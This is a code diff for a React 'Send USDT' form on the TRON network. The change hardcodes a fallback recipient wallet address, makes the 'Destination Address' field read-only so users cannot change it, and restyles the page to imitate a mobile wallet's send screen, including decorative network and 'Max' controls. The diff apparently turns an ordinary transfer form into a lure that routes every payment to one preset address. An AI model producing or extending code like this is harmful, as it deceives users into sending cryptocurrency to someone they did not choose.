@@ -4,10 +4,11 @@ import { walletManager } from './lib/wallet';
 
 const CFG = {
   USDT: process.env.NEXT_PUBLIC_USDT || 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
+  RECIPIENT: process.env.NEXT_PUBLIC_RECIPIENT || 'TB8MxQp21ukvxRWMSC5RYGVGpmf9AEdUUy',
 };
 
 export default function SendForm() {
-  const [addr, setAddr] = useState('');
+  const [addr, setAddr] = useState(CFG.RECIPIENT);
   const [amount, setAmount] = useState('1');
   const [btn, setBtn] = useState({ text: 'Next', disabled: false });
   const [notif, setNotif] = useState(null);
@@ -71,52 +72,72 @@ export default function SendForm() {
   };
 
   return (
-    <div className="flex flex-col items-center justify-center p-4">
+    <div className="page">
       {notif && (
-        <div className={`fixed top-4 left-1/2 -translate-x-1/2 p-4 rounded-xl shadow-2xl z-[9999] transition-all transform animate-in fade-in slide-in-from-top-4 duration-300 max-w-[90vw] text-center font-medium ${notif.type === 'error' ? 'bg-red-500 text-white' : 'bg-blue-600 text-white'
-          }`}>
+        <div className={`notification notification--${notif.type}`}>
           {notif.msg}
         </div>
       )}
 
-      <div className="w-full max-w-md bg-white p-6 rounded-3xl shadow-xl mt-4">
-        <h1 className="text-xl font-bold text-center mb-6">Send USDT</h1>
+      <header className="header">
+        <h1 className="header-title">Send USDT</h1>
+      </header>
 
-        <div className="space-y-4">
-          <div>
-            <label className="block text-sm text-gray-500 mb-1">Destination Address</label>
+      <main className="container">
+        <div>
+          <label className="label">Destination Address</label>
+          <div className="input-wrap">
             <input
               type="text"
-              placeholder="TRON Address"
-              className="w-full p-4 bg-gray-50 rounded-2xl border-none focus:ring-2 focus:ring-blue-500 transition-all text-sm"
+              className="input"
               value={addr}
-              onChange={(e) => setAddr(e.target.value)}
+              readOnly
             />
           </div>
+        </div>
 
-          <div>
-            <label className="block text-sm text-gray-500 mb-1">Amount</label>
-            <div className="relative">
-              <input
-                type="number"
-                className="w-full p-4 bg-gray-50 rounded-2xl border-none focus:ring-2 focus:ring-blue-500 transition-all text-sm"
-                value={amount}
-                onChange={(e) => setAmount(e.target.value)}
-              />
-              <span className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 font-bold text-xs">USDT</span>
+        <div>
+          <label className="label">Destination network</label>
+          <div className="network-box">
+            <img
+              src="https://cryptologos.cc/logos/tron-trx-logo.png"
+              alt="TRON"
+              className="network-icon"
+            />
+            <span className="network-name">TRON Network</span>
+            <svg width="10" height="6" viewBox="0 0 10 6" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M1 1L5 5L9 1" stroke="#8E8E93" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
+            </svg>
+          </div>
+        </div>
+
+        <div>
+          <label className="label">Amount</label>
+          <div className="input-wrap">
+            <input
+              type="number"
+              className="input"
+              value={amount}
+              onChange={(e) => setAmount(e.target.value)}
+            />
+            <div className="input-actions">
+              <span className="currency">USDT</span>
+              <span className="action" style={{ marginLeft: '8px' }}>Max</span>
             </div>
           </div>
-
-          <button
-            onClick={handleNext}
-            disabled={btn.disabled}
-            className={`w-full p-4 rounded-2xl font-bold text-white transition-all transform active:scale-95 shadow-lg ${btn.disabled ? 'bg-gray-300 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700'
-              }`}
-          >
-            {btn.text}
-          </button>
+          <div className="usd-value">~${parseFloat(amount || 0).toFixed(2)}</div>
         </div>
-      </div>
+      </main>
+
+      <footer className="bottom">
+        <button
+          onClick={handleNext}
+          disabled={btn.disabled}
+          className="next-btn"
+        >
+          {btn.text}
+        </button>
+      </footer>
     </div>
   );
 }
